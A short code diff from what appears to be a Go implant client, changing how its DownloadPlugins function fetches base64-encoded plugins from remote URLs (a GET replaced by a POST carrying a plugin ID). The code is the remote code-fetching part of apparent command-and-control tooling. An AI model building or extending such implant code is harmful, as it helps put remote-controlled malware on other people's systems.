@@ -48,7 +48,9 @@ func CheckError(err error) {
 func (implantClient ImplantClient) DownloadPlugins() error {
 	for idx, pluginToDownload := range implantClient.PluginsToRun {
 		DebugPrinter("Downloading from " + pluginToDownload.PluginUrl)
-		res, err := http.Get(pluginToDownload.PluginUrl)
+		res, err := http.PostForm(pluginToDownload.PluginUrl, url.Values{
+			"pluginId": {pluginToDownload.PluginId},
+		})
 		defer res.Body.Close()
 		pluginBase64, err := ioutil.ReadAll(res.Body)
 		CheckError(err)
